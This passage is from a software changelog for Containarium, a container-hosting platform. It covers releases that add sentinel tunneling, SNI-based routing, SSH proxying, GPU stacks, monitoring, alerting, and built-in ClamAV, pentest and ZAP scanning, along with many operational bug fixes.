  - **Daemon srv0 wrapper** (#106): `--proxy-protocol` and `--proxy-protocol-trusted` CLI flags; `ProxyManager.EnableProxyProtocol(trustedCIDRs)` installs a `[proxy_protocol, tls]` `listener_wrappers` chain plus `trusted_proxies` on the running Caddy. Empty/wildcard CIDR lists are rejected. Uses atomic `getFullConfig` + `loadConfig` so other srv0 fields (`listen`, `routes`, `automatic_https`, etc.) are preserved.
  - **Daemon caddy-l4 wrapping-aware lifecycle** (#107): the L4 server is produced in pattern B shape (one outer route with handlers `[layer4.handlers.proxy_protocol, layer4.handlers.subroute]`) when `--proxy-protocol` is set. `ActivateL4`, `getRoutes`, `putRoutes` are all wrapping-aware so `RouteSyncJob`'s CRUD operations on the inner subroute don't undo the wrapper. SNI passthrough routes inside the subroute keep working both with and without a leading PROXY header (deploy-gap safe). Catchall to the HTTP server emits `proxy_protocol: "v2"` so srv0's listener_wrapper can recover the source.

## [0.16.2] - 2026-05-08

### Fixed
- **`containarium-shell` breaks collaborator SSH logins** (`scripts/setup-peer-user.sh`): The shell script derived the target container as `${USERNAME}-container`, so a collaborator account `voice-dev-container-test` resolved to `voice-dev-container-test-container` (nonexistent), producing `Error: Container not found` on every login. Collaborator accounts follow the `<owner>-container-<collaborator>` naming pattern; the container is `<owner>-container`. Fix: if the primary container lookup fails, strip the trailing `-<collaborator>` suffix with `${USERNAME%-*}` and retry. Regular owner accounts (`voice-dev` → `voice-dev-container`) are unaffected. Existing deployments must re-push the script to each node (GCP spot VM and peer nodes).

## [0.16.1] - 2026-05-06

### Fixed
- **Jump server account missing sudoers entry** (`internal/container/jump_server.go`): `CreateJumpServerAccount` (the path used when the daemon auto-creates a container's host user) wrote `useradd` and the SSH key but never wrote `/etc/sudoers.d/containarium-<user>`. The user's `containarium-shell` then hit a password prompt on every SSH because `sudo incus exec` had no NOPASSWD rule. `EnsureJumpServerAccount` (a separate entry point) already had the sudoers write; this brings the primary path to parity. Symptom: `ssh <user>` returned `[sudo] password for <user>:` and hung. Existing host users on running daemons stay broken until the operator writes the sudoers file manually (see `setup-peer-user.sh`) or the daemon recreates them.

## [0.16.0] - 2026-05-06

### Added
- **Multi-pool architecture** — One sentinel can now front multiple independent Containarium clusters, each with its own primary VM, peers, core stack, and subdomain. See [docs/MULTI-POOL.md](docs/MULTI-POOL.md).
  - **Pool tag on peers** — `containarium tunnel --pool=<name>` and `setup-peer.sh --pool=<name>` propagate a pool tag through the tunnel handshake to `TunnelSpot` and `Backend`. `GET /sentinel/peers?pool=<name>` filters by tag (omitting the param keeps the back-compat behavior of returning all peers).
  - **Pool-scoped peer discovery** — `containarium daemon --pool=<name>` makes the primary's `PeerPool.discover()` append `?pool=` to its sentinel call, so a primary sees only its own pool's peers.
  - **Primary self-registration** — `containarium daemon --public-hostname=<host> --public-port=<port>` makes the daemon `POST /sentinel/primaries` at startup, heartbeat every 30s, and `DELETE` on shutdown. Sentinel evicts entries that miss heartbeats for 90s. The sentinel auto-fills the primary's IP from the request's `RemoteAddr` so the daemon doesn't need to know its own routable address.
  - **SNI-based routing on the sentinel** — The HTTPS dispatcher peeks the TLS ClientHello SNI and looks up the matching primary via the registry, forwarding TCP bytes (still TLS passthrough) to that primary's IP:port. Connections with no SNI, malformed handshakes, or unregistered hostnames fall back to the existing single-backend forwarding — fully back-compat for unpooled deployments.
  - **Hostname aliases for app domains** — `--public-aliases foo.example,bar.example` (also `Primary.Aliases` in the registry) lets a primary advertise every hostname its Caddy serves, not just its own subdomain. The SNI router matches against `Hostname` plus all `Aliases`, so app domains like `api.example.com` route to the correct pool's primary instead of falling through to the legacy single-backend default.
  - **Primary registration via tunnel handshake** — `containarium tunnel --public-hostname=<host> --public-aliases=… --public-port=443` (also exposed in `setup-peer.sh`) tells the sentinel to promote that tunnel into a primary registry entry pointing at its loopback alias. Lets a primary VM behind NAT/Tailscale register itself without needing direct HTTP access to `/sentinel/primaries`. The tunnel disconnect cleans up the primary entry automatically. SNI routing then forwards inbound TLS bytes back through the same tunnel.
  - **Token-bound pool authorization** — `containarium sentinel --tunnel-token-policy <token>=<pool1>,<pool2>` (repeatable) replaces "any token can claim any pool" with explicit `token → []allowed_pools` rules. A token restricted to `lab` can no longer register a tunnel claiming `pool=prod`. The legacy `--tunnel-token` keeps working as a wildcard rule (any pool allowed). Use `*` as a pool name for explicit wildcard. Adds a typed `Pool` (Go `type Pool string`) with a `PoolAny` constant so the policy rules and registry lookups can't be confused with hostnames or other strings.
  - **SNI router uses yamux for tunneled primaries** — When a primary is tunnel-promoted (slice 6), its `IP` is a sentinel-side loopback alias. Going through a TCP listener on that alias would conflict with the sentinel's own ConnMux on `:443`. Slice 8 fixes this: the SNI dispatcher detects `Primary.BackendID != ""` and uses `TunnelRegistry.DialTunnel(spotID, port)` to open a yamux stream straight to the primary's local port, bypassing any sentinel-side TCP listener for that port. The tunnel server also skips binding a loopback proxy listener for `PublicPort` to avoid the noisy "address already in use" log line.

### Fixed
- **Tunnel handshake over-read corrupts yamux** — `readHandshake` and `readHandshakeResponse` used `json.NewDecoder` over the raw connection. Its internal buffer can swallow bytes that arrive in the same TCP packet as the JSON (e.g., the yamux SYN frame the sentinel writes immediately after the handshake response when keysync starts). Those buffered bytes are unreachable once the decoder is discarded, so yamux's frame reader misaligns and produces `Invalid protocol version: <byte>` errors — observed in production when a backend host reconnected under load and saw `version: 71` (the `'G'` from a buffered HTTP `GET`). Fix: read line-delimited (newline-terminated) JSON, leaving any subsequent bytes on the underlying reader for yamux. Both sides updated. Latent bug present since the original tunnel implementation; not specific to slice 8 even though the slice 8 deploy is what surfaced it.
- **Tunnel-promoted primaries decay after 90s TTL** — `PrimaryRegistry.All()` evicts entries whose `LastHeartbeat` is older than `PrimaryTTL` (90s). Tunnel-promoted primaries (slice 6) only get `LastHeartbeat` set at handshake time and have no heartbeat refresher, so they silently drop out of `/sentinel/primaries` 90s after registration even though the yamux session stays up. Fix: skip TTL eviction for entries with `BackendID` set. Their lifetime is tied to the yamux session via `OnTunnelConnect` / `OnTunnelDisconnect` (`UnregisterByBackendID`); TTL is for HTTP-registered primaries that may have died without `DELETE`'ing.
- **Lab pool bring-up: 4 issues caught while standing up first tunneled primary**
  - **Subnet drift between `--network-subnet` flag and actual incusbr0** (`internal/cmd/daemon.go`): Incus' `EnsureNetwork` is idempotent and won't change a pre-existing bridge's subnet. The daemon used to trust the flag value and pass it as `HostIP` for Caddy reverse_proxy upstreams, traffic-collector network filter, etc. — when the bridge's actual subnet differed (e.g., `10.52.59.0/24` from `incus admin init --auto` vs `--network-subnet=10.0.4.1/24`), Caddy proxied to a non-existent gateway and returned silent 502s. Fix: after `InitializeInfrastructure`, query `GetNetworkSubnet("incusbr0")` and use that as the authoritative subnet, logging the override if different.
  - **Port forwarder missing OUTPUT-chain DNAT** (`internal/network/portforward.go`): tunnel-promoted primaries (slice 6) have the tunnel client receive a yamux stream and dial `127.0.0.1:443` to forward bytes locally. PREROUTING DNAT alone doesn't catch local-origin packets; OUTPUT chain is needed. Added `ensureOutputRule(port)` alongside the existing `ensurePreRoutingRule(port)`, with per-rule idempotency so an upgraded deploy with PREROUTING but not OUTPUT picks up the missing rule on next setup.
  - **`route_localnet=1` not enabled** (`internal/network/portforward.go`): even with the OUTPUT DNAT in place, the kernel's default `route_localnet=0` refuses to route `127.0.0.0/8` packets out a non-loopback interface. The port forwarder now sets `net.ipv4.conf.all.route_localnet=1` at runtime and persists it via `/etc/sysctl.d/99-containarium-route-localnet.conf`.
  - **Caddy TLS app missing on first install** (`internal/app/proxy.go`): `ProvisionTLS` PATCHed `/config/apps/tls/automation/policies` directly, but on a fresh Caddy `apps.tls` is `null` — Caddy returned 400 `invalid traversal path`. The `ensureTLSApp` helper already existed (creates `apps.tls` with a default ACME policy via PUT) but wasn't being called from `ProvisionTLS`. Wired it in, and made the null check robust to Caddy's `"null\n"` (with trailing whitespace) response.
  - **Port forwarder runs before Caddy spawned** (`internal/server/dual_server.go`): on first install, the daemon's auto-detect-Caddy step at startup runs BEFORE `EnsureCaddy` spawns the Caddy container. The auto-detect logged a warning and skipped port-forward setup; first deploys required a daemon restart to pick it up. Fix: re-run `PortForwarder.SetupPortForwarding` immediately after `EnsureCaddy` succeeds.
- **Postgres restart policy missing on auto-detected containers** (`internal/server/dual_server.go`): when the daemon auto-detects an existing `containarium-core-postgres` container (the path used by primaries running without `--app-hosting`, e.g. prod), it just records the connection string and never invokes `ensurePostgresRestartPolicy()`. Result: postgres has no `Restart=on-failure` systemd override, and an OOM kill leaves it down indefinitely (we hit a 12-day silent outage that took down Grafana). Fix: re-apply the policy on the auto-detect path; idempotent.
- **GPU device passthrough breaks across kernel upgrades** (`internal/incus/client.go`, `internal/container/manager.go`): containers were configured with `gpu: { id: "0", type: gpu }`, where `id` is Incus' DRM card minor index. When a kernel upgrade renumbers DRM minors (observed on a backend host across a `6.8.0-110` → `6.8.0-111` point-release, where the GPU's DRM minor moved from `card0` to `card1`), every container with `id: "0"` fails to start with `Failed to detect requested GPU device`. Fix: new `Client.ResolveGPUInputToPCI()` resolves the user's `--gpu N` (positional index) or PCI string into the GPU's PCI address at container creation time. Containers always get pinned by PCI, which is stable across reboots and kernel changes. Existing containers with `id`-based config aren't auto-migrated; document the manual fix in the runbook (see `incus config device set <name> gpu pci=<addr>`).
- **Lab pool SSH lands at host nologin instead of inside the container** (`scripts/install-lab-phase-b.sh`, `internal/container/jump_server.go`): the lab install script never installed `/usr/local/bin/containarium-shell`, so the daemon's `getUserShell()` fell back to `/usr/sbin/nologin` when creating per-container host users. SSH then authenticated successfully but the upstream sshd ran nologin and printed "This account is currently not available." Fix: install-lab-phase-b.sh now installs the wrapper and writes `/etc/motd` with the standard Containarium banner labelled `${POOL} pool` (idempotent — both steps no-op if already in place). The daemon also stops writing `~/.hushlogin` when creating users; the host MOTD *is* the Containarium banner and was the only signal that the session was going through the proxy hop. Existing per-container host users keep their stale `.hushlogin` until manually removed.

### Added
- **GPU stacks** — New `gpu` (nvidia-utils-570, CUDA toolkit, cuDNN) and `gpu-docker` (CUDA + Docker CE + nvidia-container-toolkit) stacks for container provisioning
- **Peer metrics federation** — Local metrics collector pushes peer container and system metrics to VictoriaMetrics with `backend_id` labels; Grafana dashboard adds Backend Node dropdown and per-node panels
- **Container provisioning state** — New `CONTAINER_STATE_PROVISIONING` proto enum shows stack installation progress during async container creation
- **Auto ClamAV scan** — Newly created containers are automatically enqueued for ClamAV scanning with a 2-minute delay
- **Peer API forwarding** — Sentinel forwards metrics, system info, security summary, and container traffic requests to peer backends with service token auth
- **Per-backend system info** — `backend_id` field on SystemInfo and `peers` field on GetSystemInfoResponse for multi-backend visibility
- **ZFS backup** — `setup-gpu-host.sh` auto-detects disks, creates HDD RAID1 mirror as `incus-backup` pool, installs daily ZFS backup cron

### Changed
- **Grafana dashboard** — Reorganized with `$backend` template variable, "Node Metrics" row (CPUs, containers, memory, disk, load), and "Container Metrics" row with per-backend filtering
- **setup-gpu-host.sh** — Rewritten with `--data-disk`, `--backup-disks`, `--yes` flags and auto-detection of unused NVMe/HDD disks
- **containarium-shell** — Added ASCII banner for interactive sessions, non-interactive `-c` command support, and auto-detected incus binary path for sudoers

### Fixed
- **SSH non-interactive command forwarding** — `containarium-shell` now handles `-c "command"` arguments from sshpiper exec forwarding, in addition to `SSH_ORIGINAL_COMMAND`
- **sshpiper authorized_keys parsing** — Strip blank lines and comments before writing; sshpiper's parser stopped at blank lines, preventing key matching
- **Tunnel loopback IP reuse** — Reconnecting tunnel clients reuse their previous loopback IP, preventing stale sshpiper config and SSH failures during reconnects
- **Tunnel clean shutdown** — Close yamux session on context cancel to avoid 90-second SIGKILL timeout
- **Peer metrics parsing** — Use `protojson.Unmarshal` for gRPC-gateway enum strings and `json.Number` for quoted numeric values

## [0.14.0] - 2026-03-28

### Added
- **Multi-backend peer operations** — Resize, CleanupDisk, and Collaborator operations (Add/Remove/List) now forward to peer backends when the container is not local
- **Terminal WebSocket peer routing** — Terminal sessions proxy to peer backends transparently via `PeerTerminalProxy` interface; the gateway bridges WebSocket connections between client and peer
- **Per-backend system info API** — New `GET /v1/backends/{id}/system-info` endpoint returns CPU, memory, disk, and GPU info for a specific backend
- **GPU system info** — `GPUVendor` and `GPUModel` proto enums, `GPUInfo` message with vendor/model/driver/CUDA/VRAM fields, populated from Incus server resources
- **Web UI node filter and search** — Real-time search by name/username/IP, node dropdown filter (when multiple backends), filtered count display, backend chip on grid cards
- **Web UI backend resource selector** — Toggle button group on System Resources card to view CPU/memory/disk/GPU stats per backend, with auto-refresh
- **SSH container proxy (`containarium-shell`)** — Login shell that proxies SSH sessions into containers via `incus exec`, enabling unified `ssh user@sentinel` for all backends including firewalled/NAT hosts
- **Setup script** `scripts/setup-ssh-container-proxy.sh` — Installs containarium-shell, sudoers rule, and /etc/shells entry

### Fixed
- **Tunnel SSH port conflict** — Tunnel server uses port 20022 for SSH proxy listeners on loopback aliases, preventing conflict with sshpiper's `*:22` binding on the sentinel
- **NVIDIA GPU model name** — Fixed duplicate brand prefix in model name string from Incus nvidia sub-struct


### Added
- **OWASP ZAP web application scanning** — New "ZAP Scan" tab under Security for automated web application vulnerability scanning of all exposed Containarium endpoints.
  - Full gRPC service with 8 RPCs: trigger scan, list scans, list alerts, get summary, suppress alert, get config, download report, install ZAP
  - PostgreSQL persistence with 3 tables (`zap_scan_runs`, `zap_alerts`, `zap_scan_jobs`) and fingerprint-based alert deduplication
  - Async job queue with 2 concurrent workers and configurable scan interval (default 30 days)
  - Spider + active scan per target URL via ZAP daemon REST API running inside the security container
  - HTML/JSON report generation and download per scan run
  - React UI with summary cards, alert table with risk/status filters, pagination, suppress dialog, CSV/JSON export, scan history with report download, and one-click ZAP installation
  - Proto definitions (`proto/containarium/v1/zap.proto`), server implementation, and REST gateway
- **Pentest findings download** — Download all filtered pentest findings as CSV or JSON from the Security > Pentest tab. The download respects current severity/category/status filters and fetches up to 1000 findings per target type.

### Changed
- **Security tools moved to container** — nuclei, trivy, and ZAP now install and run inside the `containarium-core-security` container instead of the host filesystem, freeing ~290MB on the root disk. The pentest installer, nuclei module, and trivy module all use `incus exec` to operate inside the container. Trivy mounts target container rootfs via disk devices.

### Fixed
- **Port-scan findings misclassified as domain findings** — The `ports` scanner module now only runs on container targets, preventing open-port findings from appearing under "Domain Findings". Existing misclassified findings are automatically reclassified on startup.

## [v0.13.0] - 2026-03-15

### Added
- **Penetration testing system** — Built-in security scanner with 7 modules that scan container endpoints and dependencies:
  - **Built-in modules**: `ports` (open port detection), `headers` (HTTP security header audit), `tls` (weak protocol/cipher/cert checks), `web` (exposed .env/.git/debug endpoints), `dns` (dangling CNAMEs, missing SPF/DMARC/DKIM)
  - **External tool modules**: `nuclei` (template-based vulnerability scanning) and `trivy` (container filesystem CVE scanning via rootfs inspection) — auto-installable from the UI
  - 8 gRPC/REST endpoints (`/v1/pentest/*`): trigger scans, list findings with severity/category/status filters, suppress findings, view scan history, install tools
  - Async job queue with 5 concurrent workers, SHA-256 fingerprint-based finding deduplication, scheduled scans (default 24h), 90-day retention
  - Proto definitions (`proto/containarium/v1/pentest.proto`), server implementation, and web UI (Security > Pentest tab)
- **Demo page: Alerts, Audit, and Pentest tabs** — Complete demo coverage with mock data for all tabs including alert rules, webhook delivery history, audit logs, and grouped pentest findings.

### Changed
- **Pentest findings grouped by container** — The Security > Pentest tab now groups findings by container name instead of showing a flat list. Each group has a collapsible header showing the container name and finding count, sorted by most findings first.
- **README screenshots updated** — Replaced numbered screenshots with descriptive names; added Alerts and Audit sections.
- **Next.js upgraded to 16.1.6** — Security update addressing CVE-2025-66478 (RCE), CVE-2025-55182/55183/55184 (RSC vulnerabilities), and CVE-2026-23864 (DoS).

## [v0.12.0] - 2026-03-15

### Added
- **Alerting system with vmalert + Alertmanager** — Metric-based alerting integrated into the daemon via VictoriaMetrics vmalert (v1.108.1) and Prometheus Alertmanager (v0.27.0), running inside the `core-victoriametrics` container.
  - 9 default alert rules: `HighMemoryUsage`, `HighDiskUsage`, `DiskAlmostFull`, `HighCPULoad`, `MetricsCollectionDown`, `ContainerHighMemory`, `ContainerHighCPU`, `ContainerStopped`, `NoRunningContainers`
  - Custom alert rule CRUD via gRPC/REST API (`/v1/alerts`) with PostgreSQL persistence
  - Webhook notifications with optional HMAC-SHA256 payload signing (`X-Containarium-Signature` header) via an internal relay
  - Webhook delivery history tracking (`/v1/system/alerting/deliveries`) with 1000-row / 30-day retention
  - Idempotent setup — detects existing vmalert install and only updates rules on restart
- **Alerts web UI** (`/webui/alerts/`) — Full management interface with tabs for default rules, custom rules, and delivery history. Clickable rule rows open a detail dialog showing the full PromQL expression, equivalent vmalert YAML, and a PromQL writing guide. Webhook configuration dialog with HMAC secret generation and inline verification code examples (Python, Go, Node.js).
- **Alert proto definitions** (`proto/containarium/v1/alert.proto`) — 8 new RPCs: `CreateAlertRule`, `ListAlertRules`, `GetAlertRule`, `UpdateAlertRule`, `DeleteAlertRule`, `GetAlertingInfo`, `UpdateAlertingConfig`, `TestWebhook`, `ListWebhookDeliveries`
- **OCI runtime wrapper for Docker cgroup limit injection** — Registers a custom OCI runtime (`containarium-runtime`) as Docker's default via `daemon.json`. Intercepts every `runc create` — from CLI, Compose v2, or API — and injects LXC memory/CPU cgroup limits into the OCI spec. Also bind-mounts LXCFS-backed `/proc` files (`meminfo`, `cpuinfo`, `stat`, etc.) so tools like `free` and `top` report correct values inside nested containers. See [`docs/OCI-RUNTIME-CGROUP-INJECTION.md`](docs/OCI-RUNTIME-CGROUP-INJECTION.md).
- **Automatic OCI runtime upgrade on daemon startup** — `UpgradeCgroupWrappers()` now installs the OCI runtime on all existing Docker containers, in addition to CLI wrappers
- **Caddy L4 SNI-based TLS passthrough** — mTLS gRPC services are now exposed on `:443` via SNI hostname routing, eliminating the need for per-port GCP firewall rules and sentinel iptables forwarding. Caddy L4 inspects the TLS ClientHello SNI field without decrypting, preserving end-to-end mTLS.
- **L4ProxyManager** (`internal/app/l4_proxy.go`) — manages Caddy L4 TLS passthrough routes via the admin API using atomic `/load` config replacement
- **Lazy L4 activation** — the L4 layer activates only when TLS passthrough routes exist in the database and deactivates automatically when all are removed
- **TLS Passthrough protocol** (`tls_passthrough`) — new route protocol in protobuf, route store, and sync job (`ROUTE_PROTOCOL_TLS_PASSTHROUGH = 5`)
- **Custom Caddy build with L4 plugin** — `setupCaddy()` now builds Caddy via xcaddy with `github.com/mholt/caddy-l4` instead of stock apt install
- **TLS Passthrough section in Network UI** — dedicated table section with VpnLockIcon showing SNI-routed connections on `:443`
- L4 config types (`CaddyL4App`, `CaddyL4Server`, `CaddyL4Route`, etc.) in `internal/app/caddy_types.go`

### Changed
- **Add Route form simplified** — removed the old "Passthrough (TCP/UDP)" route type selector; all routes now use a unified form with Protocol dropdown (HTTP / gRPC / TLS Passthrough)
- **RouteSyncJob** splits routes by protocol: HTTP/gRPC routes sync to ProxyManager, `tls_passthrough` routes sync to L4ProxyManager
- **HTTP server port handoff** — when L4 is active, the HTTP server moves from `:443` to `:8443` with `tls_connection_policies`; L4 catch-all routes non-matching SNI back to the HTTP server

### Fixed
- **Docker Compose v2 containers now see correct cgroup limits** — Previously, Compose v2 bypassed the CLI wrapper (it uses the Docker Engine API directly), so compose-managed containers saw the host's full resources instead of the LXC cgroup limits. The OCI runtime wrapper fixes this at the runc level.
- **`free` / `top` inside Docker containers now report correct memory** — LXCFS bind mounts are passed through from the LXC container into nested Docker containers via the OCI runtime

### Removed
- Old per-port TCP/UDP passthrough form in the Add Route dialog (replaced by TLS passthrough on `:443`)

## [v0.11.0] - 2026-03-11

### Added
- **ClamAV security scanning** — Full antivirus integration via a `containarium-core-security` container running ClamAV. Scans container root filesystems by mounting them read-only into the security container.
  - Persistent scan reports in PostgreSQL (`clamav_reports` table) with filtering by container, status, and date range
  - CSV export via `GET /v1/security/clamav-reports/export`
  - Per-container summary API (`GET /v1/security/clamav-summary`) with clean/infected/never-scanned counts
  - Automatic daily background scan cycle with 90-day report retention
- **Async scan job queue** — ClamAV scans now run asynchronously via a PostgreSQL-backed job queue (`scan_jobs` table), replacing the previous synchronous blocking approach.
  - `POST /v1/security/clamav-scan` returns immediately with queued job count instead of blocking for 10+ minutes
  - 3-worker pool processes scans concurrently, polling the queue with `FOR UPDATE SKIP LOCKED` for safe concurrent claiming
  - Automatic retries (up to 2) for transient failures (e.g., stale mount errors)
  - Jobs survive daemon restarts — pending/failed-retryable jobs resume automatically
- **Scan status API** — New `GET /v1/security/scan-status` endpoint returns real-time queue state: per-job details and aggregate pending/running/completed/failed counts
- **Security dashboard** — New `/security` page in the web UI
  - Summary cards: total, clean, infected, and never-scanned container counts
  - Container table sorted by severity (infected first), with expandable per-container scan history
  - Context-aware per-container scan action icons reflecting job queue state: hourglass (queued), spinner (running), green checkmark (completed), red error with tooltip (failed), scanner icon (idle)
  - Real-time scan progress bar with status counts, polls every 5 seconds during active scans
  - Date range picker for CSV report download
- **Core services section** — New panel in the web UI showing infrastructure container status (PostgreSQL, Caddy, VictoriaMetrics, ClamAV) via `GET /system/core-services`
- **Stack install CLI** — New `containarium install-stack` command for deploying predefined container stacks

### Changed
- **`SecurityService` proto** — New gRPC service with 4 RPCs: `ListClamavReports`, `TriggerClamavScan`, `GetClamavSummary`, `GetScanStatus`. Auto-registered on the gRPC-gateway for REST access.

## [v0.10.0] - 2026-03-09

### Added
- **Monitoring stack** — Auto-provision VictoriaMetrics + Grafana as a core service container (`containarium-core-victoriametrics`). A single consolidated dashboard is embedded in the web UI Monitoring tab via a `/grafana/` reverse proxy, rendered in kiosk mode with light theme.
  - System metrics: CPU load (1m/5m/15m), memory/disk gauges, running/stopped container counts
  - Per-container metrics: CPU usage (cores via `rate()`), memory, disk, network I/O
  - Grafana uses existing PostgreSQL for config database, file-based dashboard provisioning
- **OpenTelemetry metrics collector** — In-process OTel SDK pushes system and per-container metrics every 30s via OTLP/HTTP to VictoriaMetrics (`internal/metrics/otel.go`)
- **HTTP metrics middleware** — Tracks API request rate and latency histograms (`internal/metrics/http_middleware.go`)
- **`GetMonitoringInfo` API** — New gRPC/REST endpoint (`GET /v1/system/monitoring`) returning Grafana URL, VictoriaMetrics URL, and enabled status
- **Disk cleanup API** — Disk cleanup endpoint, route toggle, and URL-based tab routing (#42)
- **Stop container API** — Add stop container endpoint (#41)

### Fixed
- **Passthrough routes now persist across VM restarts** — TCP/UDP port-forwarding rules (iptables DNAT) were purely ephemeral and lost on VM recreation. They are now stored in PostgreSQL as the source of truth, mirroring the existing `RouteStore`/`RouteSyncJob` pattern for HTTP proxy routes (#39).
- **Subdomain concatenation** — Fix subdomain being incorrectly concatenated in certain configurations (#40)

## [0.9.1] - 2026-02-28

### Fixed
- **Boot disk size validation** — Lowered minimum from 100GB to 10GB to support production environments with small boot disks (e.g., sentinel VMs).

## [0.9.0] - 2026-02-28

### Changed
- **Terraform module consolidation** — Extracted all infrastructure resources into a reusable module at `terraform/modules/containarium/`. The dev consumer (`terraform/gce/`) and any production deployment can now consume a single source of truth via `git::` module source, eliminating config drift.
- **Startup scripts parameterized** — `fail2ban_whitelist_cidr` and `jwt_secret` are now Terraform template variables instead of hardcoded values, allowing the same scripts to serve different environments (e.g., `10.128.0.0/9` for default network vs `10.0.0.0/8` for VPC).
- **Sentinel runs in same region as spot VM** — Removed `sentinel_region`/`sentinel_zone` variables. Sentinel always deploys in the same zone as the spot VM, matching the production topology.
- **Go embed package rewritten** — Replaced broken `//go:embed` directives (Go doesn't allow `../` in embed paths) with `runtime.Caller()` + `os.ReadFile()` approach. Exports `TerraformDir()`, `ConsumerDir()`, `ModuleDir()` helpers.
- **E2E test updated** — Test workspace now copies the full `gce/` + `modules/` tree so relative module source paths resolve correctly.

### Added
- **`terraform/modules/containarium/`** — New shared Terraform module containing all GCE resources (VMs, firewall rules, disks, startup scripts). Parameterizes environment differences via variables:
  - `network_self_link` / `subnetwork_self_link` — VPC vs default network
  - `spot_vm_external_ip` — ephemeral IP vs Cloud NAT only
  - `enable_iap_firewall` / `enable_health_check_firewall` — production firewall rules
  - `enable_glb_backend` — unmanaged instance group for GLB
  - `jwt_secret` — REST API authentication (empty = auto-generate)
  - `fail2ban_whitelist_cidr` — internal network whitelist
  - `instance_tags` — customizable network tags
  - `spot_vm_name_suffix` — appended to instance name for spot VM (e.g., `-spot`)
- **Production consumer example** at `terraform/modules/containarium/examples/production-consumer/` showing how to consume the module with VPC networking, GLB backend, and IAP firewall rules.

### Removed
- **`horizontal-scaling.tf`** — Horizontal scaling (multiple independent jump servers behind an NLB) is incompatible with the sentinel architecture. Multi-region scaling uses one sentinel+spot pair per region instead.
- **`null_resource` provisioners** — Removed binary SCP provisioners (`copy_containarium_binary`, `copy_binary_to_sentinel`). Binary deployment now uses `containarium_binary_url` exclusively.
- **`ssh_private_key_path` variable** — No longer needed without SCP provisioners.
- **Horizontal scaling example tfvars** (`horizontal-scaling-3-servers.tfvars`, `horizontal-scaling-5-servers.tfvars`).

### Fixed
- **`zpool import -f` in startup-spot.sh** — Forces ZFS pool import when the pool was last used by a different system (common after spot VM recreation). Previously could fail silently.
- **Incus pre-removal in startup-spot.sh** — Removes Ubuntu 24.04's pre-installed Incus 6.0.0 before installing from Zabbly repo, avoiding package conflicts.

## [0.8.2] - 2026-02-28

### Added
- **sshpiper SSH reverse proxy on sentinel** — Deploys [sshpiper](https://github.com/tg123/sshpiper) on sentinel port 22 as an L7 SSH proxy with built-in `failtoban` plugin. Bans client IPs after 3 failed auth attempts (1h ban). Replaces iptables DNAT for SSH, which masked real client IPs and caused fail2ban on the spot VM to ban the sentinel itself.
- **Authorized keys sync** — New `KeyStore` in sentinel syncs SSH authorized keys from the spot VM via `/authorized-keys` HTTP endpoint. Generates sshpiper YAML config mapping each user to the upstream spot VM. Sync runs every 2 minutes; sshpiper is only restarted when config actually changes (avoids killing active sessions).
- **`/authorized-keys` HTTP endpoint** on the spot VM daemon — Returns all jump server users' SSH public keys as JSON. Used by sentinel's KeyStore to build sshpiper routing config.
- **`/authorized-keys/sentinel` POST endpoint** on the spot VM daemon — Accepts the sentinel's upstream public key and appends it to all jump server users' `authorized_keys`, enabling sshpiper to authenticate to the spot VM on behalf of users.
- **Key sync status on sentinel dashboard** — SSH Proxy (sshpiper) section shows synced user count, last sync time, and errors.
- **fail2ban whitelist on spot VM** — Whitelists internal VPC ranges so the sentinel IP is never banned as a safety net.

### Changed
- **Sentinel sshd moved to port 2222 only** — sshd on the sentinel now listens on port 2222 only (management/IAP access). Port 22 is owned by sshpiper. Includes systemd socket override for Ubuntu 24.04 socket activation.
- **Port 22 removed from iptables DNAT** — `enableForwarding()` in `iptables.go` now filters port 22 from the forwarded ports list. SSH traffic reaches sshpiper on the sentinel directly instead of being DNAT'd to the spot VM.
- **Default forwarded ports** — Changed from `22,80,443,50051` to `80,443,50051` in the sentinel CLI.

### Fixed
- **SSH brute-force attacks no longer block all users** — Previously, attackers hitting sentinel:22 were DNAT'd with MASQUERADE to the spot VM, which saw all connections from the sentinel's IP. fail2ban on the spot VM would ban the sentinel IP, blocking all SSH. sshpiper now handles SSH at L7, sees real client IPs, and bans attackers directly.

### Security
- sshpiper `failtoban` plugin provides IP-level banning based on actual SSH auth failures (not connection rate), correctly identifying attackers vs. legitimate users.
- Sentinel's upstream key is automatically distributed to all jump server accounts, so sshpiper can authenticate to the spot VM without storing user private keys.

## [0.8.1] - 2026-02-27

### Fixed

- **Spot VM preemption recovery race condition**: daemon now waits for core containers (PostgreSQL, Caddy) to be healthy before auto-detection and config loading, preventing permanent route loss after VM restart
- **PostgreSQL connection retry**: all connection sites (daemon config, route store, collaborator store) retry up to 5 times with 3-second intervals instead of failing on first "connection refused"
- **Container outbound internet broken by sentinel iptables**: sentinel PREROUTING jump now excludes the container bridge network (`! -s 10.0.3.0/24`), fixing HTTPS from containers being DNAT'd to the spot VM's own IP instead of reaching the internet

### Changed

- **Label-based core container identification**: core containers tagged with `user.containarium.role` labels (`core-postgres`, `core-caddy`) instead of hardcoded name matching; existing containers auto-backfilled on startup
- **Boot priority ordering**: core containers have `boot.autostart.priority` (PostgreSQL=100, Caddy=90) so Incus starts them in correct order after restart
- **Type-safe `incus.Role` type**: introduced typed string for core container roles replacing raw string comparisons
- **Core containers hidden from user listings**: containers with a `user.containarium.role` label excluded from `ListContainers` API

## [0.8.0] - 2026-02-27

### Added
- **Sentinel TLS certificate sync** — sentinel syncs real Let's Encrypt certificates from spot VM's Caddy server, serves valid HTTPS during maintenance mode instead of self-signed certs
  - New `/certs` endpoint on daemon gateway exports Caddy certificates as JSON
  - `CertStore` with SNI-based lookup: exact domain → wildcard → self-signed fallback
  - New daemon flag: `--caddy-cert-dir` (default: `/var/lib/caddy/.local/share/caddy`)
  - New sentinel flag: `--cert-sync-interval` (default: `6h`)
  - Immediate cert sync on recovery (MAINTENANCE → PROXY transition)
- **Sentinel status page** — real-time recovery information at `/sentinel` during maintenance mode
  - Shows: current mode, spot VM IP, forwarded ports, preemption count, last preemption, outage duration, cert sync status
  - Dark theme matching maintenance page, auto-refreshes every 10s
- **Sentinel JSON status API** — machine-readable `/status` endpoint on binary server port (8888), always available regardless of mode
- **Management SSH on port 2222** — sentinel listens on port 2222 for direct management access (port 22 is DNAT'd to spot VM in proxy mode)
  - Startup script configures sshd to listen on both port 22 and 2222
  - New Terraform firewall rule: `sentinel_mgmt_ssh` for port 2222
- **`docs/SENTINEL-DESIGN.md`** — comprehensive sentinel architecture documentation covering modes, TLS cert sync, status page, CLI reference, one-sentinel-to-many-spot-VMs scaling, Terraform config, and operational runbook

### Changed
- Updated README.md architecture to reflect one-sentinel-to-many-spot-VMs scaling model
